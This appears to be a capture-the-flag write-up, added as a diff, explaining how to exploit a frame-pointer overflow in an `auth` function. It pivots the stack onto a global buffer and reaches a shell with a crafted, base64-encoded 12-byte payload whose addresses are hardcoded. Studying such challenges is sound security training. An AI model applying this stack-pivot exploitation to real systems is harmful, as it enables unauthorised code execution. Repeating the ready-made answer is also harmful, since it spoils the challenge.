@@ -1,0 +1,50 @@
+flag:
+	"control EBP, control ESP, control EIP, control the world~"
+
+
+`auth`:
+$ebp+0x04	ret address
+$ebp+0x00	prev $ebp
+$ebp-0x04
+$ebp-0x08	^decoded_input^		<--- `g_decoded_input` is written to ^here^
+$ebp-0x14	hash_input		<--- 12 bytes from ^here^ are used to calculate hash
+
+So we have a buffer overflow onto `prev $ebp`. But what to write to it?
+
+Before leaving `auth`, this value is set to $ebp. Right after returning (assuming hash comparison failed, which it will), we do `leave` and then `retn` (see `main`). `leave` will set `$esp` to `$ebp`, and will do a pop. `retn` will then jump to the address pointed to by `$esp`
+
+The whole flow:
+1.	$ebp <- prev $ebp
+2.	$esp <- $ebp
+3.	$esp += 4	($ebp <- *($esp))
+4.	jmp $esp
+
+`prev $ebp`+0x04	jumped address
+`prev $ebp`+0x00	new $ebp
+
+So we need somewhere we can write an address to jump, and address this location too.
+`g_decoded_input` sounds like a good place, assuming it's in a constant address (meaning we can address it). We will move our stack there then.
+
+So g_decoded_input shall look like the following:
+
+g_decoded_input+0x08	g_decoded_input
+g_decoded_input+0x04	shell
+g_decoded_input+0x00	new $ebp
+
+We will set `new $ebp` to `g_decoded_input` too, cuz why not - don't wanna ruin anything that relies on that (even though there is probably nothing that does - `$ebp` is reset after calling `system`).
+
+So all in all:
+
+g_decoded_input+0x08	g_decoded_input			0x0811EB40	'\x40\xeb\x11\x08'
+g_decoded_input+0x04	shell				0x08049284	'\x84\x92\x04\x08'
+g_decoded_input+0x00	new $ebp (=g_decoded_input)	0x0811EB40	'\x40\xeb\x11\x08'
+
+g_decoded_input = b'\x40\xeb\x11\x08\x84\x92\x04\x08\x40\xeb\x11\x08'
+
+However (see `main`):
+* g_deocded_input = decoded_input = Base64Decode(encoded_input) = Base64Decode(straight user input)
+From which we get:
+* straight user input = Base64Encode(g_decoded_input)
+
+So our input is the base64 encoding of the above string, which is 'QOsRCISSBAhA6xEI'.
+So just enter this string, and get a shell :)
